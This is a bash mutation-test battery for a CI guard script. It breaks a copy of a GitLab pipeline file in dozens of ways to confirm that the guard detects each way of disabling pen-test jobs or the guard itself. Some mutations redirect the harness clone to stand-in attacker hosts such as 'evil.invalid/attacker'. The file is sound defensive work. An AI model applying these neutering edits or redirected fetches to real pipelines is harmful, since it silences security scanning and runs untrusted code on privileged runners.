#!/usr/bin/env bash
# =============================================================================
# check-ci-wiring.test.sh — the guard THAT guards.
#
# check-ci-wiring.sh passing against the real .gitlab-ci.yml proves nothing on its
# own: a check that can never fail passes for free, which is precisely how the
# pen-test wiring went inert org-wide in the first place. So this battery breaks
# the CI file one way at a time, in a COPY, and asserts the guard catches each
# break. Every mutation is verified to have actually changed the file before its
# result is believed — a rewrite that silently matched nothing would otherwise
# look like a guard that failed to fire.
#
# Mutations are awk programs, not perl/python one-liners, so the battery needs
# nothing the plain shell runner does not already have. Runs in well under a
# second: no network, no Docker.
# =============================================================================
set -u
set +o pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SELF_DIR}/.." && pwd)"
GUARD="${SELF_DIR}/check-ci-wiring.sh"
REAL_CI="${REPO_ROOT}/.gitlab-ci.yml"

PASS=0
FAIL=0

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

report() {
  local verdict
  verdict="$1"
  shift
  if [ "$verdict" = "pass" ]; then
    PASS=$((PASS + 1))
    printf 'PASS  %s\n' "$*"
  else
    FAIL=$((FAIL + 1))
    printf 'FAIL  %s\n' "$*" >&2
  fi
}

# --- leg 1: the real file must PASS ------------------------------------------
if bash "$GUARD" "$REAL_CI" "$REPO_ROOT" >"${WORK}/real.log" 2>&1; then
  report pass "real .gitlab-ci.yml passes the guard"
else
  report fail "real .gitlab-ci.yml FAILS the guard"
  cat "${WORK}/real.log" >&2
fi

# --- leg 2: a missing file must be a hard FATAL, not a pass -------------------
bash "$GUARD" "${WORK}/does-not-exist.yml" "$WORK" >/dev/null 2>&1
if [ "$?" -eq 2 ]; then
  report pass "absent CI file exits 2 (FATAL), never 0"
else
  report fail "absent CI file did not exit 2"
fi

# seed_scripts <dir>: make a scratch copy look like a real checkout.
# Check 9 asserts the CI file names a battery script that EXISTS on disk, so a
# scratch dir holding nothing but a .gitlab-ci.yml would fail every mutation for
# a reason that has nothing to do with the mutation — a battery that reports
# "detected" for the wrong reason is not evidence. Every scratch tree therefore
# carries the two scripts.
seed_scripts() {
  local dir
  dir="$1"
  mkdir -p "${dir}/scripts"
  cp "$GUARD" "${dir}/scripts/check-ci-wiring.sh"
  cp "${SELF_DIR}/check-ci-wiring.test.sh" "${dir}/scripts/check-ci-wiring.test.sh"
}

# --- leg 3: the mutation battery ---------------------------------------------
# mutate <name> <awk program>: apply the program to a COPY of the real CI file,
# assert the copy actually differs, then assert the guard rejects it.
mutate() {
  local name
  name="$1"
  local prog
  prog="$2"
  local dir
  dir="${WORK}/m$((PASS + FAIL))"
  mkdir -p "$dir"
  seed_scripts "$dir"
  awk "$prog" "$REAL_CI" > "${dir}/.gitlab-ci.yml"
  if cmp -s "$REAL_CI" "${dir}/.gitlab-ci.yml"; then
    report fail "mutation '${name}' did NOT change the file — the mutation itself is broken"
    return
  fi
  if bash "$GUARD" "${dir}/.gitlab-ci.yml" "$dir" >"${dir}/out.log" 2>&1; then
    report fail "mutation '${name}' was NOT detected (guard still passed)"
  else
    report pass "mutation '${name}' detected"
  fi
}

# accept <name> <awk program>: the mirror of mutate(). Some edits are BENIGN and
# the guard must NOT red them. A guard whose false positives are one flag away is
# a guard people learn to click past, which is the failure mode the whole file
# exists to prevent — so the acceptances are tested as hard as the rejections.
accept() {
  local name
  name="$1"
  local prog
  prog="$2"
  local dir
  dir="${WORK}/a$((PASS + FAIL))"
  mkdir -p "$dir"
  seed_scripts "$dir"
  awk "$prog" "$REAL_CI" > "${dir}/.gitlab-ci.yml"
  if cmp -s "$REAL_CI" "${dir}/.gitlab-ci.yml"; then
    report fail "control '${name}' did NOT change the file — the control itself is broken"
  elif bash "$GUARD" "${dir}/.gitlab-ci.yml" "$dir" >"${dir}/out.log" 2>&1; then
    report pass "benign edit accepted: ${name}"
  else
    report fail "benign edit '${name}' was REJECTED — false positive"
    cat "${dir}/out.log" >&2
  fi
}

# mutate_msg <name> <awk program> <fragment>: as mutate(), and the FAIL the guard
# prints must be the one that DIAGNOSES this break, not merely some failure.
#
# Most checks here need only detection, so mutate() asks only for a non-zero exit.
# A few exist purely to give the RIGHT diagnosis where a later check would red the
# file anyway — the flow-style `rules:` branch of check 9c is one: a rules: list
# the guard cannot read yields no coverage either, so 9c reds it regardless, and a
# pass/fail-only test cannot tell the two apart. Deleting that branch left this
# battery at full green until this helper existed.
mutate_msg() {
  local name
  name="$1"
  local prog
  prog="$2"
  local want
  want="$3"
  local dir
  dir="${WORK}/d$((PASS + FAIL))"
  mkdir -p "$dir"
  seed_scripts "$dir"
  awk "$prog" "$REAL_CI" > "${dir}/.gitlab-ci.yml"
  if cmp -s "$REAL_CI" "${dir}/.gitlab-ci.yml"; then
    report fail "mutation '${name}' did NOT change the file — the mutation itself is broken"
  elif bash "$GUARD" "${dir}/.gitlab-ci.yml" "$dir" >"${dir}/out.log" 2>&1; then
    report fail "mutation '${name}' was NOT detected (guard still passed)"
  elif grep -F "$want" "${dir}/out.log" >/dev/null; then
    report pass "mutation '${name}' detected, and diagnosed"
  else
    report fail "mutation '${name}' was detected but NOT diagnosed — no FAIL mentioned '${want}'"
    cat "${dir}/out.log" >&2
  fi
}

mutate "drop the generator include" '
  /^include:/ { skip = 1; next }
  skip && /^[^ \t#]/ { skip = 0 }
  !skip { print }
'

mutate "drop pentest from stages" '
  { sub(/^stages: \[lint, build, pentest\]$/, "stages: [lint, build]"); print }
'

mutate "delete the whole pentest:dast job" '
  /^pentest:dast:/ { skip = 1; next }
  skip && /^[^ \t#]/ { skip = 0 }
  !skip { print }
'

mutate "rebind pentest:dast to the wrong hidden job" '
  { sub(/extends: \.pentest-dast-baseline/, "extends: .pentest-dast-full"); print }
'

mutate "strip allow_failure from pentest:dast" '
  /^pentest:dast:/ { inblk = 1 }
  inblk && /^[^ \t#]/ && !/^pentest:dast:/ { inblk = 0 }
  inblk && /^  allow_failure: true$/ { next }
  { print }
'

mutate "strip allow_failure from pentest:sca" '
  /^pentest:sca:/ { inblk = 1 }
  inblk && /^[^ \t#]/ && !/^pentest:sca:/ { inblk = 0 }
  inblk && /^  allow_failure: true$/ { next }
  { print }
'

mutate "remove the harness fetch (job goes inert)" '
  /^    - git clone --depth 1 --branch main/ { next }
  { print }
'

mutate "point PENTEST_HARNESS_DIR where nothing is fetched" '
  /PENTEST_HARNESS_DIR:/ { print "    PENTEST_HARNESS_DIR: \"tests/pentest\""; next }
  { print }
'

mutate "drop the !reference splice (loses pinned nuclei + harness FATAL)" '
  /^    - !reference \[\.pentest-dast-base, before_script\]$/ { next }
  { print }
'

mutate "give a job an undeclared stage" '
  { sub(/^  stage: lint$/, "  stage: security"); print }
'

# The pen-test jobs' `needs: []` is load-bearing: without it, stage ordering puts
# them behind build:image, which is not allow_failure, so a failed image build on
# the default branch deletes both security jobs from the pipeline.
mutate "remove needs: [] from the pen-test jobs (a failed build then deletes the scan)" '
  /^pentest:(sca|dast):/ { inblk = 1 }
  inblk && /^[^ \t#]/ && !/^pentest:(sca|dast):/ { inblk = 0 }
  inblk && /^  needs: \[\]$/ { next }
  { print }
'

# --- the mutations that an earlier version of the guard did NOT catch ---------
# Each of these three leaves pentest:dast 100% inert at runtime, and each of them
# passed the substring-shaped checks the guard shipped with. They are the nearest
# neighbours of the real bug, which is exactly where a guard has to fire.
mutate "clone lands beside PENTEST_HARNESS_DIR, not at it" '
  { if ($0 ~ /git clone --depth 1/) sub(/\/\.pentest-harness"$/, "/.pentest-harness-old\""); print }
'

mutate "splice the base before_script BEFORE the fetch (FATAL fires on an absent tree)" '
  /^    - !reference \[\.pentest-dast-base, before_script\]$/ { next }
  /^  before_script:$/ { print; print "    - !reference [.pentest-dast-base, before_script]"; next }
  { print }
'

mutate "point PENTEST_HARNESS_DIR at a wrong subpath inside the fetched clone" '
  { sub(/\.pentest-harness\/tests\/pentest"$/, ".pentest-harness/tests/security\""); print }
'

mutate "skew the harness clone off the ref the include: pins" '
  { if ($0 ~ /git clone --depth 1/) sub(/--branch main/, "--branch v1"); print }
'

# `extends:` REPLACES arrays. Restating two of the base's three rules looks like a
# faithful copy and deletes SCA from every scheduled pipeline.
mutate "restate the base rules on pentest:sca (drops the scheduled pipeline)" '
  /^pentest:sca:/ {
    print
    print "  rules:"
    print "    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\""
    print "    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH"
    next
  }
  { print }
'

# The release job is subject to the same rule as the security jobs: this file put
# a lint stage in front of build, so without an explicit needs: a red guard would
# silently swallow the image build (and the ArgoCD input that tracks its tag).
mutate "remove needs: [] from build:image (a red lint stage then deletes the release job)" '
  /^build:image:/ { inblk = 1 }
  inblk && /^[^ \t#]/ && !/^build:image:/ { inblk = 0 }
  inblk && /^  needs: \[\]$/ { next }
  { print }
'

# --- the mutations that retire the GUARD rather than the wiring ---------------
# Checks 1-8 only matter if something runs them. None of these five edits touches
# a pen-test job, and before checks 9-11 existed every one of them left the guard
# printing "ok" on its way to scanning nothing.
mutate "allow_failure on the wiring guard job (the guard goes advisory)" '
  /^lint:ci-wiring:/ { print; print "  allow_failure: true"; next }
  { print }
'

mutate "when: manual on the wiring guard job (nothing checks an MR)" '
  /^lint:ci-wiring:/ { print; print "  when: manual"; next }
  { print }
'

mutate "the lint job runs the guard but not the battery that proves it can fail" '
  { sub(/check-ci-wiring\.test\.sh/, "check-ci-wiring.sh"); print }
'

mutate "the wiring guard job deleted outright" '
  /^lint:ci-wiring:/ { skip = 1; next }
  skip && /^[^ \t#]/ { skip = 0 }
  !skip { print }
'

mutate "the lint job runs a battery that is not in the repo" '
  { sub(/scripts\/check-ci-wiring\.test\.sh/, "ci/check-ci-wiring.test.sh"); print }
'

# `allow_failure: true` makes a FINDING non-blocking (policy). `when: manual`
# makes the SCAN optional, which is a different thing wearing the same clothes:
# the pipeline still shows a `pentest:dast` entry.
mutate "when: manual on pentest:dast (a scan nobody clicks is not a scan)" '
  /^pentest:dast:/ { print; print "  when: manual"; next }
  { print }
'

mutate "when: manual on pentest:sca" '
  /^pentest:sca:/ { print; print "  when: manual"; next }
  { print }
'

# The fetch is the one place this pipeline pulls executable code from off-repo and
# runs it on a privileged runner.
mutate "harness cloned from a literal foreign host instead of this pipeline org" '
  { if ($0 ~ /git clone --depth 1/) sub(/\$\{ORG_BASE\}/, "https://example.invalid/attacker"); print }
'

mutate "harness cloned from a same-org NEIGHBOUR of the generator" '
  { if ($0 ~ /git clone --depth 1/) sub(/hugmesh-generator\.git/, "hugmesh-generator-fork.git"); print }
'

mutate "harness cloned from an undefined variable (origin not pinned to this server)" '
  { if ($0 ~ /git clone --depth 1/) sub(/\$\{ORG_BASE\}/, "${MIRROR_BASE}"); print }
'

# SHELL IS LAST-ASSIGNMENT-WINS. The first form of check 11 asked whether SOME
# assignment of the clone origin derived from a CI_ variable, so appending one
# line after the honest derivation left it printing "ok  : …itself derived from a
# CI_ variable in this job" while the privileged runner cloned and executed an
# attacker's tree. This is the single highest-consequence mutation in the file.
mutate "a SECOND ORG_BASE= assignment redirects the fetch (last assignment wins)" '
  { print; if ($0 ~ /^    - ORG_BASE=/) print "    - ORG_BASE=\"https://evil.invalid/attacker\"" }
'

# --- the mutations that neuter the guard job's INVOCATION rather than the job -
# Check 9 used to assert only that the CI file NAMED the battery. Naming a script
# is not running it: each of these leaves the battery mentioned in the file, the
# job green, and nothing checked. Same neutering class as allow_failure, spelled
# in shell instead of YAML.
mutate "the battery invocation short-circuited with || true" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh || true"); print }
'

mutate "the battery invocation dead behind a leading true ||" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- true || bash scripts/check-ci-wiring.test.sh"); print }
'

mutate "an exit 0 script item above the battery invocation" '
  { if ($0 ~ /- bash scripts\/check-ci-wiring\.test\.sh$/) print "    - exit 0"; print }
'

mutate "a set +e above the battery invocation (a failing battery stops failing the job)" '
  { if ($0 ~ /- bash scripts\/check-ci-wiring\.test\.sh$/) print "    - set +e"; print }
'

# GitLab does not set pipefail, so the job takes tee's exit status, not the
# battery's. Tidying a noisy job into a log file is an entirely ordinary edit.
mutate "the battery piped through tee (the job takes the pipe's last status)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh | tee wiring.log"); print }
'

# --- the same neutering edits, one keystroke away from the spellings above ----
# `when: manual` and `when: "manual"` are identical YAML. Checks 9 and 10 shipped
# with a bare-word grep, so quoting the scalar retired the guard job and either
# pen-test job while every check kept printing "ok".
mutate 'when: "manual" (QUOTED) on the wiring guard job' '
  /^lint:ci-wiring:/ { print; print "  when: \"manual\""; next }
  { print }
'

mutate 'when: "manual" (QUOTED) on pentest:dast' '
  /^pentest:dast:/ { print; print "  when: \"manual\""; next }
  { print }
'

# ...and a rules: set that simply never matches uses no forbidden word at all.
# "Only lint on tags, to save runner time" retires the guard exactly as
# `when: manual` does, and is the likelier real-world edit of the two.
# Both halves of check 9c, INDEPENDENTLY. Removing both rules at once leaves
# either half able to catch it on its own, so neither half is actually tested —
# a guard mutation that widened only the merge-request half survived the battery
# until these two were split out.
mutate "the guard job's rules: narrowed off MERGE REQUESTS only" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /merge_request_event/ { next }
  { print }
'

mutate "the guard job's rules: narrowed off the DEFAULT BRANCH only" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /CI_DEFAULT_BRANCH/ { next }
  { print }
'

mutate "the guard job's rules: narrowed off merge requests and the default branch" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /CI_DEFAULT_BRANCH/ { next }
  injob && /merge_request_event/ { next }
  { print }
'

# GitLab's OTHER spelling of allow_failure. The battery exits 1, which is exactly
# the status this form excuses.
mutate "allow_failure: exit_codes: on the wiring guard job" '
  /^lint:ci-wiring:/ { print; print "  allow_failure:"; print "    exit_codes: 1"; next }
  { print }
'

# --- the mutations that leave the JOB perfect and delete the SCAN -------------
# `extends:` REPLACES arrays — the mechanism checks 6 and 6c already exist for —
# and `script:` is where the scan itself lives. Every one of these leaves the job
# name, the stage, allow_failure, needs, the harness fetch, the ref pin and the
# !reference splice exactly as they are; the pipeline shows a `pentest:dast` entry
# that ran an echo. That is not a near-miss of the failure this guard exists for,
# it IS that failure in two lines.
mutate "pentest:dast overrides script: (the job scans nothing and looks perfect)" '
  /^pentest:dast:/ { print; print "  script:"; print "    - echo DAST-temporarily-disabled"; next }
  { print }
'

mutate "pentest:sca overrides script:" '
  /^pentest:sca:/ { print; print "  script:"; print "    - echo SCA-temporarily-disabled"; next }
  { print }
'

# ...and the same edit dressed to look like the real thing: it names the harness,
# it runs the harness, and it scans nothing.
mutate "pentest:dast script: overridden with a harness --help" '
  /^pentest:dast:/ { print; print "  script:"; print "    - bash \"${PENTEST_HARNESS_DIR}/run-pentest.sh\" --help"; next }
  { print }
'

# --- the mutations that neuter the guard job from OUTSIDE its script: ---------
# GitLab concatenates before_script and script into ONE shell, so `exit 0` in a
# before_script ends the job SUCCESSFUL having run nothing. The job's own
# before_script does it; so does a top-level `default:`, which applies to every
# job that declares none — and lint:ci-wiring is exactly such a job.
mutate "before_script: exit 0 on the guard job (the shell ends before the battery)" '
  /^lint:ci-wiring:/ { print; print "  before_script:"; print "    - exit 0"; next }
  { print }
'

mutate "a top-level default: before_script: exit 0 (shadows the guard job, which declares none)" '
  NR == 1 { print "default:"; print "  before_script:"; print "    - exit 0"; print "" }
  { print }
'

# --- the invocation-neutering spellings one keystroke from `|| true` ----------
# `;` is `|| true` with one character changed: the shell takes the LAST command
# status either way. `&` never takes it at all. An if-wrapper takes the branch
# instead. All three left the first form of check 9d printing "ok".
mutate "the battery invocation followed by ; true (last status wins)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh; true"); print }
'

mutate "the battery backgrounded with a trailing & (its status is never taken)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh \\&"); print }
'

mutate "the battery wrapped in an if (the job takes the branch, not the battery)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- if bash scripts/check-ci-wiring.test.sh; then echo clean; else echo dirty; fi"); print }
'

# ...and the same class with no ';' anywhere, so ONLY the construct test can catch
# it. Without this case, deleting that test left the battery at full green: the
# if-wrapper above also carries semicolons, and the ';' test caught it instead.
mutate "the battery invocation NEGATED with a leading ! (a failing battery greens the job)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- ! bash scripts/check-ci-wiring.test.sh"); print }
'

# --- the rules: edits that leave the condition spelled out and match nothing ---
# `changes:` is the likelier real edit than a narrowed `if:` ever was: both if:
# strings stay literally present in the file, so any grep over the flat rules list
# still finds them, while the job is created on essentially no pipeline — every
# merge request that edits only scripts/ included.
mutate "the guard job's rules: narrowed by changes: (both if: strings still present)" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /^    - if:/ { print; print "      changes: [\"deploy/**\"]"; next }
  { print }
'

# A rules: set this guard cannot READ is a rules: set that can retire it while
# check 9c prints ok — the same "unreadable therefore green" hole as every other
# one in this file.
mutate_msg "the guard job's rules: rewritten in flow style (unreadable to the guard)" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /^  rules:$/ { print "  rules: [{ if: $CI_COMMIT_TAG }]"; inrules = 1; next }
  inrules && /^    - if:/ { next }
  inrules && !/^    - if:/ { inrules = 0 }
  { print }
' "not in the block form this guard can read"

# --- the edit that retires the guard AND both scans, one level up -------------
# $CI_COMMIT_BRANCH is unset on a merge_request_event, so this workflow: creates
# no merge-request pipeline at all: lint:ci-wiring, pentest:sca and pentest:dast
# vanish together, with no forbidden word anywhere. `workflow` is in the reserved
# skip list checks 8 and 9 use to tell jobs from configuration, which is exactly
# why nothing looked at it.
mutate "a top-level workflow: rules: that creates no merge-request pipeline" '
  NR == 1 { print "workflow:"; print "  rules:"; print "    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH"; print "" }
  { print }
'

# --- the include:, where a neighbouring name is worse than on the clone -------
# The include supplies .pentest-dast-base's entire before_script (a curl plus an
# `unzip -d /usr/local/bin/`) and .pentest-dast-baseline's script, both of which
# then run on the `privileged` runner: here the template IS the executed code.
# `grep -F "hugmesh/hugmesh-generator"` is satisfied by a fork of that name, and
# with the clone line untouched every other check passes too.
mutate "the include: names a NEIGHBOUR of the generator (substring-satisfying fork)" '
  /^[[:space:]]*- project:/ { sub(/hugmesh-generator/, "hugmesh-generator-fork") }
  { print }
'

mutate "the include: names a different template file in the same repo" '
  /^[[:space:]]*file:/ { sub(/pentest-stage\.gitlab-ci\.yml/, "pentest-stage-lite.gitlab-ci.yml") }
  { print }
'

# The last-assignment-wins mutation above uses a LITERAL url, which the first half
# of check 11's per-assignment loop (must begin with an expansion) catches on its
# own — so the second half (must name a CI_ variable) had no test of its own, and
# deleting it left this battery at full green. A second assignment that IS an
# expansion, of a variable this pipeline does not define, is that test.
mutate "a SECOND ORG_BASE= assignment from a NON-CI variable (expansion, still unpinned)" '
  { print; if ($0 ~ /^    - ORG_BASE=/) print "    - ORG_BASE=\"${MIRROR_BASE}/mirror\"" }
'

# --- leg 4: positive control for the VENDORED branch -------------------------
# The guard must accept the other legitimate shape (harness vendored at the
# template's default path, no PENTEST_HARNESS_DIR override), or it is not a
# check on reachability, just a check on one spelling.
VEND="${WORK}/vendored"
mkdir -p "${VEND}/tests/pentest"
seed_scripts "$VEND"
printf '#!/usr/bin/env bash\n' > "${VEND}/tests/pentest/run-pentest.sh"
awk '
  /^  variables:$/ { drop = 1; next }
  drop && /PENTEST_HARNESS_DIR:/ { drop = 0; next }
  { print }
' "$REAL_CI" > "${VEND}/.gitlab-ci.yml"
if cmp -s "$REAL_CI" "${VEND}/.gitlab-ci.yml"; then
  report fail "vendored-shape control did not change the file"
elif bash "$GUARD" "${VEND}/.gitlab-ci.yml" "$VEND" >"${VEND}/out.log" 2>&1; then
  report pass "vendored-harness shape is accepted (positive control)"
else
  report fail "vendored-harness shape rejected — guard is over-fitted to the fetch shape"
  cat "${VEND}/out.log" >&2
fi

# --- leg 5: negative control for the VENDORED branch -------------------------
# ...and it must NOT accept that shape when the vendored harness is absent.
NOVEND="${WORK}/vendored-missing"
mkdir -p "$NOVEND"
seed_scripts "$NOVEND"
cp "${VEND}/.gitlab-ci.yml" "${NOVEND}/.gitlab-ci.yml"
if bash "$GUARD" "${NOVEND}/.gitlab-ci.yml" "$NOVEND" >/dev/null 2>&1; then
  report fail "no PENTEST_HARNESS_DIR and no vendored harness was accepted — the inert case"
else
  report pass "no override + no vendored harness is rejected (negative control)"
fi

# --- leg 6: positive control for check 8 -------------------------------------
# `needs:` is one of TWO ways to be ungated; the other is having nothing that can
# fail run earlier. Without this control, check 8 would just be "grep for needs:"
# and would wrongly red a repo whose pen-test stage genuinely runs first.
UNGATED="${WORK}/ungated"
mkdir -p "$UNGATED"
seed_scripts "$UNGATED"
awk '
  { sub(/^stages: \[lint, build, pentest\]$/, "stages: [pentest, lint, build]") }
  /^pentest:(sca|dast):/ { inblk = 1 }
  inblk && /^[^ \t#]/ && !/^pentest:(sca|dast):/ { inblk = 0 }
  inblk && /^  needs: \[\]$/ { next }
  { print }
' "$REAL_CI" > "${UNGATED}/.gitlab-ci.yml"
if cmp -s "$REAL_CI" "${UNGATED}/.gitlab-ci.yml"; then
  report fail "ungated-shape control did not change the file"
elif bash "$GUARD" "${UNGATED}/.gitlab-ci.yml" "$UNGATED" >"${UNGATED}/out.log" 2>&1; then
  report pass "pen-test stage running first, with no needs:, is accepted (positive control)"
else
  report fail "a pen-test stage that nothing precedes was rejected — check 8 is over-fitted to needs:"
  cat "${UNGATED}/out.log" >&2
fi

# --- leg 7: positive control for check 11 -------------------------------------
# The org's other fetch-shaped repo (hugmesh-admin-ui) builds the clone url from
# the CI_SERVER_* triple + CI_JOB_TOKEN rather than from CI_REPOSITORY_URL. That
# is equally CI-derived and must pass, or check 11 is not "the source is pinned to
# this pipeline's server", just "the source is spelled ${ORG_BASE}".
SERVERVAR="${WORK}/serverurl"
mkdir -p "$SERVERVAR"
seed_scripts "$SERVERVAR"
awk '
  /^    - ORG_BASE=/ { next }
  {
    if ($0 ~ /git clone --depth 1/) {
      sub(/"\$\{ORG_BASE\}\/hugmesh-generator\.git"/,
          "\"${CI_SERVER_PROTOCOL}://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}:${CI_SERVER_PORT}/hugmesh/hugmesh-generator.git\"")
    }
    print
  }
' "$REAL_CI" > "${SERVERVAR}/.gitlab-ci.yml"
if cmp -s "$REAL_CI" "${SERVERVAR}/.gitlab-ci.yml"; then
  report fail "CI_SERVER_* clone-shape control did not change the file"
elif bash "$GUARD" "${SERVERVAR}/.gitlab-ci.yml" "$SERVERVAR" >"${SERVERVAR}/out.log" 2>&1; then
  report pass "a clone url built from CI_SERVER_*/CI_JOB_TOKEN is accepted (positive control)"
else
  report fail "the CI_SERVER_* clone shape was rejected — check 11 is over-fitted to \${ORG_BASE}"
  cat "${SERVERVAR}/out.log" >&2
fi

# --- leg 8: the battery must be more than a file with the right NAME ---------
# Check 9 used to assert only that the named battery EXISTS on disk. Replacing it
# with two lines under the same name — no edit to .gitlab-ci.yml at all, so every
# mutation above is untouched — turned the whole apparatus green. A static check
# on another script's body is an inherent regress (a determined rewrite always
# wins); what must not survive is the CHEAPEST spelling of it.
STUB="${WORK}/battery-stub"
mkdir -p "${STUB}/scripts"
cp "$GUARD" "${STUB}/scripts/check-ci-wiring.sh"
printf '#!/usr/bin/env bash\nexit 0\n' > "${STUB}/scripts/check-ci-wiring.test.sh"
cp "$REAL_CI" "${STUB}/.gitlab-ci.yml"
if bash "$GUARD" "${STUB}/.gitlab-ci.yml" "$STUB" >"${STUB}/out.log" 2>&1; then
  report fail "an 'exit 0' stub under the battery's name was accepted — check 9 is an existence test only"
else
  report pass "an 'exit 0' stub under the battery's name is rejected"
fi

# --- leg 9: benign edits the guard must NOT red ------------------------------
# Check 5 and check 11 used to anchor BOTH clone arguments to end-of-line, so a
# trailing `--quiet` — the most ordinary edit imaginable on a noisy clone —
# produced three FAILs, including "clones nothing" and "'' is not
# hugmesh-generator", pointing review at a supply-chain problem that was not
# there. The arguments are parsed positionally now; this control is what keeps
# them that way.
accept "a trailing --quiet on the harness clone" '
  { if ($0 ~ /git clone --depth 1/) sub(/"$/, "\" --quiet"); print }
'

accept 'a quoted --branch "main" on the harness clone' '
  { if ($0 ~ /git clone --depth 1/) sub(/--branch main/, "--branch \"main\""); print }
'

# Check 9c asks that the guard job's rules COVER merge requests and the default
# branch. A job with no rules: at all covers every pipeline there is, so it must
# pass — or 9c is not "the guard actually runs", just "the guard has three rules".
# ...and 9c must accept every spelling that COVERS those pipelines, not just the
# org's usual one. Reddening `$CI_COMMIT_BRANCH == "main"` would be a false
# positive of exactly the kind leg 9 exists to catch.
accept 'the default branch named literally instead of via $CI_DEFAULT_BRANCH' '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /CI_DEFAULT_BRANCH/ {
    print "    - if: $CI_COMMIT_BRANCH == \"main\""
    next
  }
  { print }
'

accept "the guard job with no rules: at all (it then runs on every pipeline)" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /^  rules:$/ { inrules = 1; next }
  inrules && /^    - if:/ { next }
  inrules && !/^    - if:/ { inrules = 0 }
  { print }
'

# `--branch main`, `--branch=main` and `-b main` are the same command line. Check
# 6b's first form was a sed that demanded whitespace after `--branch`, so the
# equals spelling reported "include: pins ref 'main' but the harness clone takes
# branch '<none>'" — a template/harness-skew accusation against an identical edit,
# the same class as the `--quiet` false positive directly above.
accept "the equals spelling --branch=main on the harness clone" '
  { if ($0 ~ /git clone --depth 1/) sub(/--branch main/, "--branch=main"); print }
'

# ...and `${ORG_BASE}/x` vs `$ORG_BASE/x`. Check 11 anchored on the braced form
# only, so dropping the braces produced "does not start with a CI-derived variable
# … never a literal host": a supply-chain accusation against identical shell.
accept "the unbraced spelling \$ORG_BASE on the harness clone" '
  { if ($0 ~ /git clone --depth 1/) sub(/\$\{ORG_BASE\}/, "$ORG_BASE"); print }
'

# A `when:` inside a rules: entry gates THAT ENTRY, not the job. Check 9b grepped
# the whole job body, so "do not lint tag pipelines" — which leaves merge-request
# and default-branch coverage completely intact — was reported as "it would not run
# on a merge request or the default branch".
accept "a when: never rule that excludes only TAG pipelines" '
  /^lint:ci-wiring:/ { injob = 1 }
  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
  injob && /CI_COMMIT_TAG/ { print "    - if: $CI_COMMIT_TAG"; print "      when: never"; next }
  { print }
'

# Widening check 9d to `;` and `&` must not catch an ordinary redirect: `2>&1`
# contains an `&` and changes nothing about whose exit status the job takes.
accept "the battery invocation redirected to a log file (> wiring.log 2>&1)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh > wiring.log 2>\\&1"); print }
'

# ...nor an `&&`, which short-circuits on failure and so PRESERVES the battery's
# status, unlike the `;` and `&` next to it.
accept "the battery invocation followed by && echo (status still the battery's)" '
  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh \\&\\& echo wiring ok"); print }
'

# Check 12 must reject a workflow: that suppresses pipelines, not the key itself.
accept "a top-level workflow: rules: that still covers merge requests and the default branch" '
  NR == 1 {
    print "workflow:"
    print "  rules:"
    print "    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\""
    print "    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH"
    print ""
  }
  { print }
'

# ...and reading `default: before_script` must reject only what NEUTERS the
# battery, not the key itself.
accept "a harmless top-level default: before_script" '
  NR == 1 { print "default:"; print "  before_script:"; print "    - echo starting"; print "" }
  { print }
'

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
